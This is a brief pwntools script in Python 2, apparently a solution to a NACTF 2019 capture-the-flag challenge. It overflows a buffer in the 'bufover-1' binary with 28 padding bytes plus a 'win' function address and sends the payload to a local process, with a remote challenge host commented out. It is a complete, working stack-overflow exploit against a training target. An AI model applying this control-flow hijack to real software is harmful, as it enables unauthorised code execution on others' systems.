#!/usr/bin/python2

from pwn import *

win = 0x080491b2

exploit = 'a'*(28)
exploit += p32(win)

print(exploit)

r = process('./bufover-1')
#r = remote('shell.2019.nactf.com', 31462)
r.sendline(exploit)

a = r.recvline()
print(a)
a = r.recvline()
print(a)
a = r.recvline()
print(a)
